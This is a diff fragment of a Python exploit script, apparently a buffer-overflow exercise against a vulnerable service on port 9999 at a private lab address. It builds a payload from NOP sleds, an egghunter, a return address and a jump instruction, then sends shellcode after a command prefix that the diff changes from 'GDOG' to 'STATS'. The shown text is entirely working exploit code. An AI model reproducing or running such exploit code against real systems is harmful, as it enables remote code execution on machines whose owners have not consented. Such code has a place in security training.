@@ -49,7 +49,7 @@ stuff = "\x90"*18 + egghunter + "\x90"*20 + "\xaf\x11\x50\x62" + "\xEB\xB8\x90\x
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-cmd1 = "GDOG " + shellcode
+cmd1 = "STATS " + shellcode
 s.connect(('172.16.0.24',9999))
 s.recv(1024)
 s.send(cmd1)
